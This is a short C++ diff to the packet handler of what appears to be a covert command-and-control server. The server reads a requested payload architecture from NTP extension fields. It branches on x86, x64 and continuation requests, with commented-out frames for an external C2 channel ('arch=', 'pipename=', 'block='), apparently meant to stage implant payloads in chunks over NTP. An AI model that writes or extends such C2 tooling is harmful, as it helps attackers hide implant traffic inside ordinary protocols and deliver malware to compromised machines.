@@ -70,12 +70,52 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         printHexVectorPacket(ntpPacket.getRawPacket());
 
         //extract arch
-        uint8_t payloadArch = ntpPacketExtension[8];
+        uint8_t payloadArch = 0x00; // declared outside so its in scope
+
+        try {
+            payloadArch = ntpPacketExtension.at(8); // throws if index >= size, safer than []
+        }
+        catch (const std::out_of_range& e) {
+            std::cerr << "Packet too short: " << e.what() << std::endl;
+            return;
+        }
+
         //static cast so it shows up as hex, and not å (whcih is ascii 134 lol)
         std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl;  // prints 86
 
         if (payloadArch == 0x86) {
             std::cout << "[?] X86 Payload Requested " << std::endl;
+
+            /*
+            send_frame(socket_extc2, "arch=x86", 8);
+	        send_frame(socket_extc2, "pipename=foobar", 15);
+	        send_frame(socket_extc2, "block=100", 9);
+            
+            //get frames back
+            */
+        }
+
+        else if (payloadArch == 0x64) {
+            std::cout << "[?] X64 Payload Requested " << std::endl;
+
+            /*
+            * const these plz
+            send_frame(socket_extc2, "arch=x64", 8);
+            send_frame(socket_extc2, "pipename=foobar", 15);
+            send_frame(socket_extc2, "block=100", 9);
+
+            //get frames back
+            */
+        }
+
+        else if (payloadArch == 0x00) {
+            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
+            
+            //access class and get next chunk to send back
+        }
+
+        else {
+            std::cout << "[?] Invalid Payload" << std::endl;
         }
 
         //payloadArch.insert()
